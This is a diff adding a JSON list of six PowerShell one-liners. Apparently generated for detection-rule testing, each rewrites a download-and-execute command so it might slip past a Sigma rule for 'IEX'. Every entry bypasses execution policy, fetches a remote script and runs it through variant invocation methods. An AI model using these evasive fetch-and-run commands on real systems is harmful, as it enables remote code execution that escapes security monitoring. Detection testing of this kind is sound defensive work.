@@ -1,0 +1,26 @@
+[
+  {
+    "output": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();iex $comMsXml.ResponseText\"",
+    "explanation": "Replaced 'IEX' with its lowercase equivalent 'iex' to test if the Sigma rule is case-sensitive."
+  },
+  {
+    "output": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();[System.Management.Automation.Cmdlet]::InvokeCommand().InvokeScript($comMsXml.ResponseText)\"",
+    "explanation": "Replaced 'IEX' with an equivalent method call to test if the Sigma rule detects only direct usage of 'IEX'."
+  },
+  {
+    "output": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();(Get-Command iex).Invoke($comMsXml.ResponseText)\"",
+    "explanation": "Used reflection to invoke 'iex' dynamically, testing if the Sigma rule detects indirect execution patterns."
+  },
+  {
+    "output": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();$scriptBlock = [scriptblock]::Create($comMsXml.ResponseText);& $scriptBlock\"",
+    "explanation": "Used [scriptblock]::Create() to execute the script instead of 'IEX', testing if the Sigma rule detects alternative execution methods."
+  },
+  {
+    "output": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();$null = $comMsXml.ResponseText | iex\"",
+    "explanation": "Inserted additional spaces and a pipeline to test if the Sigma rule is affected by spacing or formatting variations."
+  },
+  {
+    "output": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();$comMsXml.ResponseText|iex\"",
+    "explanation": "Removed spaces around the pipe and 'iex' to test if the Sigma rule is sensitive to spacing in the command line."
+  }
+]
